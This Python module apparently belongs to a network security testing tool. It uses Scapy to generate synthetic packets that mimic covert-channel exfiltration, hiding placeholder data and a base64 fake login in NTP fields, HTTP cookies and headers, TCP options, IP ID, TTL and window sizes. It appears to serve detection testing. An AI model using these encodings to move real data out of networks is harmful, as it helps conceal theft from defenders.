"""Protocol abuse exfiltration traffic module."""

import base64
import random
import struct
from typing import Iterator

from scapy.layers.inet import IP, TCP, UDP
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule


class ProtocolAbuseModule(TrafficModule):
    """Traffic module for protocol abuse exfiltration patterns.

    Generates traffic that simulates data exfiltration by abusing
    legitimate protocols (NTP, HTTP headers, TCP timestamps, etc.).
    """

    def __init__(self) -> None:
        """Initialize the protocol abuse module."""
        self._abuse_count = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="protocol_abuse",
            description="Protocol abuse exfiltration (NTP covert, HTTP header, TCP timestamp)",
            category=TrafficCategory.EXFILTRATION,
            protocols=["TCP", "UDP"],
            ports=[123, 80, 443],
        )

    def _generate_ntp_covert(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate NTP covert channel pattern."""
        # NTP extension field abuse for data exfiltration
        # LI=0, VN=4, Mode=3 (client)
        flags = 0x23

        # Stratum, poll, precision
        stratum = 0
        poll = 0
        precision = 0

        # Root delay, root dispersion
        root_delay = 0
        root_dispersion = 0

        # Reference ID - can contain data
        ref_id = b"EXFL"

        # Timestamps - can contain encoded data
        fake_data = b"HIDDEN_DATA!"
        ref_timestamp = struct.unpack(">Q", fake_data.ljust(8, b"\x00")[:8])[0]

        ntp_packet = struct.pack(
            ">BBbbII4sQQQQ",
            flags, stratum, poll, precision,
            root_delay, root_dispersion,
            ref_id,
            ref_timestamp,
            ref_timestamp,
            ref_timestamp,
            ref_timestamp
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=123)
            / Raw(load=ntp_packet)
        )
        yield packet

    def _generate_http_header_covert(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate HTTP header-based covert channel."""
        # Data hidden in custom headers or cookies
        fake_data = "username=admin&password=secret"
        encoded = base64.b64encode(fake_data.encode()).decode()

        http_request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: innocent-site.com\r\n"
            f"Cookie: session={encoded}; tracking=abc123\r\n"
            f"X-Request-ID: {encoded[:32]}\r\n"
            f"X-Correlation-ID: {encoded[32:64] if len(encoded) > 32 else 'none'}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_tcp_timestamp_covert(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate TCP timestamp covert channel pattern."""
        # Encode data in TCP timestamp options
        # TSval can contain 4 bytes of data
        encoded_value = int.from_bytes(b"DATA", "big")

        tcp_options = [
            ("Timestamp", (encoded_value, 0)),
            ("NOP", None),
            ("NOP", None),
        ]

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(
                sport=random.randint(49152, 65535),
                dport=port,
                flags="S",
                options=tcp_options
            )
        )
        yield packet

    def _generate_tcp_urgent_covert(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate TCP urgent pointer covert channel."""
        # Urgent pointer can encode 16 bits of data
        urgent_data = random.randint(0, 65535)

        http_payload = b"GET / HTTP/1.1\r\nHost: test\r\n\r\n"

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(
                sport=random.randint(49152, 65535),
                dport=port,
                flags="PUA",  # Push, Urgent, Ack
                urgptr=urgent_data,
            )
            / Raw(load=http_payload)
        )
        yield packet

    def _generate_ip_id_covert(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate IP ID field covert channel."""
        # IP ID field can encode 16 bits per packet
        encoded_values = [
            int.from_bytes(b"DA", "big"),
            int.from_bytes(b"TA", "big"),
            int.from_bytes(b"EX", "big"),
            int.from_bytes(b"FL", "big"),
        ]

        for ip_id in encoded_values:
            packet = (
                IP(src=src_ip, dst=dst_ip, id=ip_id)
                / TCP(sport=random.randint(49152, 65535), dport=port, flags="S")
            )
            yield packet

    def _generate_ttl_covert(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate TTL-based covert channel pattern."""
        # TTL values encode data (unusual TTL patterns)
        message = "EXFIL"
        ttl_values = [ord(c) for c in message]

        for ttl in ttl_values:
            packet = (
                IP(src=src_ip, dst=dst_ip, ttl=ttl)
                / TCP(sport=random.randint(49152, 65535), dport=port, flags="S")
            )
            yield packet

    def _generate_reserved_bits_covert(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate TCP reserved bits covert channel."""
        # Use reserved bits (historically unused)
        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(
                sport=random.randint(49152, 65535),
                dport=port,
                flags="S",
                reserved=7,  # Set reserved bits
            )
        )
        yield packet

    def _generate_window_size_covert(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate TCP window size covert channel."""
        # Encode data in TCP window size
        encoded_values = [
            int.from_bytes(b"SE", "big"),
            int.from_bytes(b"CR", "big"),
            int.from_bytes(b"ET", "big"),
        ]

        for window in encoded_values:
            packet = (
                IP(src=src_ip, dst=dst_ip)
                / TCP(
                    sport=random.randint(49152, 65535),
                    dport=port,
                    flags="S",
                    window=window,
                )
            )
            yield packet

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate protocol abuse exfiltration packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with protocol abuse patterns
        """
        port = dst_port or 80
        self._abuse_count += 1

        # Rotate through different protocol abuse methods
        method = self._abuse_count % 8

        if method == 0:
            yield from self._generate_ntp_covert(src_ip, dst_ip)
        elif method == 1:
            yield from self._generate_http_header_covert(src_ip, dst_ip, port)
        elif method == 2:
            yield from self._generate_tcp_timestamp_covert(src_ip, dst_ip, port)
        elif method == 3:
            yield from self._generate_tcp_urgent_covert(src_ip, dst_ip, port)
        elif method == 4:
            yield from self._generate_ip_id_covert(src_ip, dst_ip, port)
        elif method == 5:
            yield from self._generate_ttl_covert(src_ip, dst_ip, port)
        elif method == 6:
            yield from self._generate_reserved_bits_covert(src_ip, dst_ip, port)
        else:
            yield from self._generate_window_size_covert(src_ip, dst_ip, port)

